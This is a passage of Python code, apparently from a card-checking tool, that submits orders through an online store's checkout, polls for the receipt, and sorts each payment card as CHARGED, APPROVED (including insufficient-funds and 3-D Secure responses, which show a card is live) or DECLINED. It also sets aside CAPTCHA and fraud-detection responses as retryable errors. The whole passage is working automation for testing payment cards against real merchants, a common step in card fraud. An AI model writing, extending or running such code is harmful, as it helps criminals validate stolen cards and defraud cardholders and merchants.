                if new_total: current_total = new_total
                time.sleep(0.05)

            check_submit_errors(submit_status, submit_body)
            logger.info(_redact(f"Step 10 status={submit_status} body={submit_body[:280]}"))

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    return _bail(CheckStatus.DECLINED, "CAPTCHA_REQUIRED", "CAPTCHA_REQUIRED", False)
                if error_msg:
                    retryable = any(k in error_msg.lower()
                                    for k in ("inventory", "retry", "try again", "generic"))
                    return _bail(CheckStatus.DECLINED, error_msg, error_msg, retryable)
                return _bail(CheckStatus.ERROR, "STEP10", "no receiptId and no error message", True)

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("could not extract sessionToken")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP10", f"Step 10 failed: {e}", True)

        # Step 11 — poll
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_re = re.compile(
            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"'
        )

        for poll_num in range(1, 21):
            if _deadline_expired():
                return _bail(CheckStatus.ERROR, "DEADLINE", "deadline during polling", True)
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token,
                )
                m = type_re.search(poll_body)
                receipt_type = m.group(1) if m else ""
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                logger.info(_redact(f"poll#{poll_num} type={receipt_type!r} body={poll_body[:220]}"))

                if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    try:
                        pj = json.loads(poll_body)
                        conf = (pj.get("data", {})
                                  .get("receipt", {})
                                  .get("confirmationPage", {})
                                  .get("url", ""))
                        result.receipt_url = conf or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    error_code = m.group(1) if m else ""

                    if "CAPTCHA" in error_code:
                        return _bail(CheckStatus.DECLINED, "CAPTCHA_REQUIRED", "CAPTCHA_REQUIRED", False)
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    if error_code == "CARD_DECLINED":
                        return _bail(CheckStatus.DECLINED, "CARD_DECLINED", "CARD_DECLINED", False)
                    if error_code == "GENERIC_ERROR":
                        return _bail(CheckStatus.DECLINED, "CARD_DECLINED", "CARD_DECLINED", False)
                    if "InventoryReservationFailure" in poll_body:
                        return _bail(CheckStatus.ERROR, "INVENTORY", "InventoryReservationFailure", True)

                    _site_signals = ("fraud", "not supported", "brand", "suspected", "risk",
                                     "shipping", "artifact", "transformer", "not available",
                                     "cannot be placed")
                    if any(s in (error_code + " " + poll_body).lower() for s in _site_signals):
                        return _bail(CheckStatus.ERROR, error_code or "SITE_ERROR",
                                     error_code or "site error", True)
                    return _bail(CheckStatus.DECLINED, error_code or "DECLINED",
                                 error_code or "declined", False)

                delay = 500
                m = poll_delay_re.search(poll_body)
                if m:
                    try:
                        d = int(m.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 3000) / 1000.0)

            except Exception as e:
                return _bail(CheckStatus.ERROR, "POLL", f"poll {poll_num} failed: {e}", True)

        return _bail(CheckStatus.ERROR, "POLL_TIMEOUT", "exceeded 20 poll attempts", True)

    finally:
        pass  # client is pooled
